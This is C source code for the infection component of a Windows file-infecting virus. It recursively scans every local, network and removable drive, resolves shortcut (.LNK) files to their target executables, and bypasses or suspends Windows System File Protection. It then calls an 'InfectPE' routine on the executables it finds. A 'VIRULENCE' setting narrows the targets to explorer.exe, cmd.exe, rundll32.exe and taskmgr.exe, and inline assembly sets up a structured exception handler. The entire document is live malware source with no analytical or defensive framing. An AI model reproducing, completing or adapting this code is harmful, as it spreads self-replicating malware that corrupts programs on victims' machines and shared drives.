
#ifdef dbgdbg
 #define NOSLEEP
 #define SCANONCE //scan each drive only once
#endif

HANDLE htrd[0xFF];
DWORD  drvl[0xFF];
DWORD sdelay; // service delay

void rscanSehSafeCode();

///////////////////////////////////////////////////////

void rscanSehHandler()
{
#ifdef _MSC_VER

	_asm
	{
		_emit 0x55							//   push   ebp
		_emit 0x89; _emit 0xE5				//   mov    ebp,esp
		_emit 0x60							//   pushad

		// now [EBP+08h]=pointer to EXCEPTION_RECORD
		//     [EBP+0Ch]=pointer to ERR structure 
		//     [EBP+10h]=pointer to CONTEXT

		// set EIP in CONTEXT structure

		_emit 0x8B; _emit 0x75; _emit 0x10	//   mov    esi,dword ptr [ebp+10]
		mov eax, rscanSehSafeCode			//   mov    eax,SehSafeCode
		_emit 0x89; _emit 0x86; _emit 0xB8	//   mov    dword ptr [esi+000000B8],eax
		_emit 0x00; _emit 0x00; _emit 0x00

		// set ESP (equal to pointer to ERR structure) in CONTEXT
		_emit 0x8B; _emit 0x45; _emit 0x0C	//   mov    eax,dword ptr [ebp+0C]
		_emit 0x89; _emit 0x86; _emit 0xC4	//   mov    dword ptr [esi+000000C4],eax
		_emit 0x00; _emit 0x00; _emit 0x00

		_emit 0x61							//   popad
		_emit 0x89; _emit 0xEC				//   mov    esp,ebp
		_emit 0x5D							//   pop    ebp
		_emit 0x31; _emit 0xC0				//   xor    eax,eax ; "reload CONTEXT"
		_emit 0xC3							//   ret
	}
#else
	_asm
	(
	 ".byte 0x55                    \n"  //   push   ebp
	 ".byte 0x89,0xE5               \n"  //   mov    ebp,esp
	 ".byte 0x60                    \n"  //   pushad

	 // now [EBP+08h]=pointer to EXCEPTION_RECORD
	 //     [EBP+0Ch]=pointer to ERR structure 
	 //     [EBP+10h]=pointer to CONTEXT

	 // set EIP in CONTEXT structure

	 ".byte 0x8B,0x75,0x10          \n"  //   mov    esi,dword ptr [ebp+10]
	 "movl $_rscanSehSafeCode,%eax\n"    //   mov    eax,SehSafeCode
	 ".byte 0x89,0x86,0xB8,0,0,0    \n"  //   mov    dword ptr [esi+000000B8],eax

	 // set ESP (equal to pointer to ERR structure) in CONTEXT
	 ".byte 0x8B,0x45,0x0C          \n"  //   mov    eax,dword ptr [ebp+0C]
	 ".byte 0x89,0x86,0xC4,0,0,0    \n"  //   mov    dword ptr [esi+000000C4],eax

	 ".byte 0x61                    \n"  //   popad
	 ".byte 0x89,0xEC               \n"  //   mov    esp,ebp
	 ".byte 0x5D                    \n"  //   pop    ebp
	 ".byte 0x31,0xC0               \n"  //   xor    eax,eax ; "reload CONTEXT"
	 ".byte 0xC3                    \n"  //   ret
	);
#endif
}

///////////////////////////////////////////////////////

void rscanSehSafeCode()
{
	_ExitThread(1);
}

///////////////////////////////////////////////////////

void ProcessLNK(char *st)
{
	HANDLE h;
	DWORD len;
	int r;
	char tmp[MAX_PATH];
	WORD itemidsz, flocinfo, finpatho;
	char exe[0xFFFF];
	char lnk[0x1FFF];
	DWORD l;

	my_strcpy(tmp, st);
	tmp[strlen(tmp) - 1] = 0;

	// read shortcut
	h = _CreateFile(tmp,GENERIC_READ | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (h == INVALID_HANDLE_VALUE) 
		return; 

	
	r = _ReadFile(h, lnk, sizeof(lnk), &len, NULL);
	_CloseHandle(h);
	if (r == 0) 
		return;

	if (lnk[0] != 'L')
		return;

	itemidsz = MAKEWORD(lnk[0x4c], lnk[0x4d]);
	//78=0x4c+2
	flocinfo = itemidsz + 78; 

	if (lnk[flocinfo]   == 0)
		return; // no file location info
	if (lnk[flocinfo+8] != 1)
		return; // 1==regular local file

	finpatho = flocinfo+MAKEWORD(lnk[flocinfo+16],lnk[flocinfo+17]);
	
	my_strcpy(exe,&lnk[finpatho]);
	l = strlen(exe);

	if((exe[l-4]!='.')||(__toupper(exe[l-3])!='E')||(__toupper(exe[l-2])!='X')||(__toupper(exe[l-1])!='E')) 
		return;

	DbgPrint("\nLNK: %s\n",tmp);

	_strcat(exe,"\\"); 
	ProcessEXE(exe,0,TRUE);
}


///////////////////////////////////////////////////////
// Process exe - SFP & call InfectPE
BOOL ProcessEXE(char *st, DWORD delay, BOOL CUT_LAST_CHR)
{
	unsigned char tmp[MAX_PATH];
	BOOL ires;
	unsigned char wf[MAX_PATH*2+10];
	DWORD q;
	BOOL IsSFP;

	my_strcpy(tmp,st);
	if (CUT_LAST_CHR==TRUE) 
		tmp[strlen(tmp)-1]=0;

	// INFECT ONLY SOME FILES
	if ((VIRULENCE > 100) && (CUT_LAST_CHR == TRUE)) 
	{
		ires = FALSE;
		if (serstr(st,"xplorer.",1) != 0xFFFF)
			ires = TRUE; // explorer
		if (serstr(st,"xplore.",1)  != 0xFFFF)
			ires = TRUE; // iexplore
		if (serstr(st,"cmd.",1)     != 0xFFFF)
			ires = TRUE;
		if (serstr(st,"init.",1)    != 0xFFFF)
			ires = TRUE; // wininit, userinit, rdpinit
		if (serstr(st,"rundll32.",1)!= 0xFFFF) 
			ires = TRUE;       
		if (serstr(st,"taskmgr.",1) != 0xFFFF)
			ires = TRUE;

		if (ires == FALSE) 
			return FALSE;
	}

	#ifndef NOSLEEP
	 __sleep(delay);
	#endif

	// 6 or later - skip SFP check (Vista, WS2008, W7)
	// it seems like SFP_OS is obsolete and protection
	// is working through owner rights (ThrustedInstaller, etc)
	if (MAJORW > 5)
		goto infect; 
	    

	// SFP VERIFICATION
	for (q = 0;; q++)
	{
		DWORD q2 =  q * 2;

		wf[q2] = tmp[q];
		wf[q2+1] = 0;

		if (tmp[q] == 0) 
		{
			wf[q2 + 2]=0;
			wf[q2 + 3]=0; 
			break; 
		}
	}
	// Check sfc.dll presence
	if (_SFC == NULL)
	{
		// 9X/ME - no sfc.dll
		goto infect; 
	}
	IsSFP = _SfcIsFileProtected(NULL, wf);
	if (IsSFP == 0) 
	{
		// No protection
		goto infect; 
	}
	// Check sfc_os.dll presence
	// sfc_os (XP) SFP 1 minute disable
	if (_SFC_OS != NULL)
	{
		DWORD r;

		// Original variant
		r = _SfcFileException(NULL, wf, -1);   

		if (r != 0) 
		{ 
			ires=FALSE; 
			goto skipinf;
		}
	} 
	else 
		goto skipinf;
	// END OF SFC VERIFICATION


	infect:;
	// InfectFileStub
	ires = InfectPE(tmp);

	skipinf:;
	 if (ires) 
	 { 
		 DbgPrint("=== ProcessEXE INFECTED OK (%s)\n",tmp); 
	 }
	 else
	 { 
		 DbgPrint("=== PeocessEXE INFECT FAILED (%s)\n",tmp); 
	 }

	return ires;
}

///////////////////////////////////////////////////////

void rscan(char *st, DWORD dr, BOOL LNK)
{
	HANDLE i;
	DWORD delay;
	char dx[10];

	WIN32_FIND_DATA f;
	char tmp[MAX_PATH]; 
	BOOL bl=TRUE;
	DWORD lst;

	if (LNK)
	{ 
		delay=0;
		goto skipnotlnk;
	}

	if (drvl[dr]==0)
	{
	 #ifdef dbgdbg
		DbgPrint("THREAD EXIT from rscan %c:\\\n",dr);
	 #endif
		_FindClose(i);
		_ExitThread(1);
	}

	delay = 100;

	_sprintf(dx, "%c:\\", dr);
	if (_GetDriveType(dx) == DRIVE_FIXED) 
		delay = 300;

	if (VIRULENCE > 100)
	{
		// INFECT ONLY SOME FILES (EXPLORER.EXE, etc...)
		delay = 30; 
	}


	skipnotlnk:;

	bl = TRUE;

	_sprintf(tmp,"%s*",st);
	lst=strlen(st);

	if (st[lst-5] == '.')
	{
		unsigned char tm4=__toupper(st[lst-4]);
		unsigned char tm3=__toupper(st[lst-3]);
		unsigned char tm2=__toupper(st[lst-2]);

		if ((tm4=='L')&&(tm3=='N')&&(tm2=='K'))
			ProcessLNK(st);
		if ((tm4=='E')&&(tm3=='X')&&(tm2=='E'))
			ProcessEXE(st,delay,TRUE);
	}

	i = _FindFirstFile(tmp,&f);
	if(i==(HANDLE)0xFFFFFFFF) 
		return;

	if (f.cFileName[0]!='.')
	{
		_sprintf(tmp,"%s%s\\",st,f.cFileName);
		rscan(tmp,dr,LNK);
	}

	while(bl)
	{
		bl=_FindNextFile(i,&f);
		if(bl==0)
		{
#ifndef NOSLEEP
			__sleep(delay+sdelay);
#endif
			_FindClose(i);
			return;
		}
		if (f.cFileName[0]!='.') 
		{ 
			_sprintf(tmp,"%s%s\\",st,f.cFileName);
			rscan(tmp,dr,LNK); 
		}
	}                           

}

///////////////////////////////////////////////////////

DWORD WINAPI InfectDrive(DWORD *dr)
{
	char dx[10];

	// Set thread SEH handler
#ifdef _MSC_VER
	_asm
	{
		push  rscanSehHandler				
		_emit 0x67; _emit 0x64; _emit 0xFF; _emit 0x36; _emit 0x00; _emit 0x00	
		_emit 0x67; _emit 0x64; _emit 0x89; _emit 0x26; _emit 0x00; _emit 0x00	
	}
#else
	_asm
	(      
		"pushl $_rscanSehHandler\n"              // push   SehHandler
		".byte 0x67,0x64,0xFF,0x36,0x00,0x00 \n" // push   dword ptr fs:[0000]
		".byte 0x67,0x64,0x89,0x26,0x00,0x00 \n" // mov    dword ptr fs:[0000],esp
	 );
#endif

 
	_sprintf(dx, "%c:\\", *dr);

	DbgPrint("DRIVE %s INFECT THREAD STARTED\n",dx);

 rloop:;
	rscan(dx,*dr,FALSE);
	__sleep(0);

 #ifdef SCANONCE
	DbgPrint("DRIVE %s SCAN FINISHED\n",dx);
	soloop:; __sleep(0); goto soloop;
 #endif

	goto rloop;
}


///////////////////////////////////////////////////////
// Infect Thread

DWORD WINAPI InfectAllDrives(DWORD *prm)
{
	DWORD dr;

 #ifdef NO_INFECT
	return 0;
 #endif


	if (VIRULENCE > 150) 
		return 0;

	for (dr = 'C'; dr <= 'Z'; dr++) 
	{
		// Init drive array
		htrd[dr]=NULL; 
	}

	// Get all drives
loop:;
	for (dr='C'; dr<='Z'; dr++)
	{
		DWORD tid;
		DWORD spc;
		DWORD bps;
		DWORD nfc;
		DWORD tnc;
		DWORD dt, ec=0;
		char dx[10]; 
		_sprintf(dx,"%c:\\",dr);
		__sleep(0);

		 // Check thread
		if (htrd[dr] == NULL)
			goto cont;
		
		_GetExitCodeThread(htrd[dr], &ec);
		if (ec == STILL_ACTIVE)
			goto cont;


		_CloseHandle(htrd[dr]); htrd[dr]=NULL;

		 // Check drive
	 cont:;
		dt = _GetDriveType(dx);

		if ((dt!=DRIVE_FIXED)&&(dt!=DRIVE_REMOTE)&&(dt!=DRIVE_REMOVABLE))
		{
			if (htrd[dr] != NULL) 
				drvl[dr] = 0; // thread without drive
			continue;
		}

		// Disable os critical error
		_SetErrorMode(SEM_FAILCRITICALERRORS); 

		 // Check removeable drives
		if (_GetDiskFreeSpace(dx, &spc, &bps, &nfc, &tnc) == 0)
		{
			if (htrd[dr]!=NULL) 
				drvl[dr] = 0; // thread without drive
			continue;
		}

		if (htrd[dr] != NULL) 
			continue; // thread already started & still alive

		if ((VIRULENCE > 50) && (dt != DRIVE_FIXED)) 
			continue;

		// Create new thread
		drvl[dr] = dr;
		htrd[dr] = _CreateThread(NULL, 0, InfectDrive, &drvl[dr], 0, &tid); 
	}

	// Count infect delay
	__sleep(0);
	goto loop;
}    
